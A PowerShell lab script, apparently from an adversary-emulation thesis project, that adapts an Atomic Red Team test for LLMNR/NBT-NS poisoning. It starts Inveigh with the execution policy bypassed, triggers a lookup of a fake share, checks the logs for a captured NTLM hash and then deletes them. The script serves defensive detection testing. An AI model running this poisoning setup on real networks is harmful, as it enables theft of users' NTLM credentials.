# ATA091 - T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay (Windows)
# Fuente ART: T1557.001 "LLMNR Poisoning with Inveigh (PowerShell)"
# (guid deecd55f-afe0-4a62-9fba-4d1ba2deb321).
# Adaptacion declarada: Inveigh pre-staged; consulta LLMNR/NBT-NS solo del invitado;
# sin relay real; el hash NTLM NO se guarda (solo capturado=True + longitud).
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA091*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null
$inveigh = Join-Path $dir 'Inveigh.ps1'
if (-not (Test-Path $inveigh)) {
    'GUARDARRAIL: Inveigh.ps1 no pre-staged' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii
    exit 2
}
$job = Start-Job -ScriptBlock {
    param($inveighPath, $outDir)
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue
    . $inveighPath
    Invoke-Inveigh -ConsoleOutput N -LogOutput Y -FileOutputDirectory $outDir -NBNS Y -MDNS Y
} -ArgumentList $inveigh, $ev
Start-Sleep -Seconds 3
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$null = cmd.exe /c dir \\tfg-fake\share 2>&1
Start-Sleep -Seconds 3
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
Stop-Job $job -ErrorAction SilentlyContinue
Remove-Job $job -Force -ErrorAction SilentlyContinue
$capturado = $false
$longitud = 0
$files = @()
if (Test-Path $ev) { $files = Get-ChildItem $ev -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'Inveigh-*' } }
foreach ($f in $files) {
    $txt = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
    if ($txt) {
        $m = [regex]::Match($txt, '[0-9A-Fa-f]{32}')
        if ($m.Success) { $capturado = $true; $longitud = $m.Value.Length; break }
    }
}
# No guardar el hash: borrar los ficheros de Inveigh
foreach ($f in $files) { Remove-Item $f.FullName -Force -ErrorAction SilentlyContinue }
@(
    "ata=ATA091", "tecnica=T1557.001", "fuente=ART_adaptado",
    "guid=deecd55f-afe0-4a62-9fba-4d1ba2deb321",
    "t0=$t0", "t1=$t1", "capturado=$capturado", "longitud=$longitud",
    "hash_guardado=False"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
exit 0
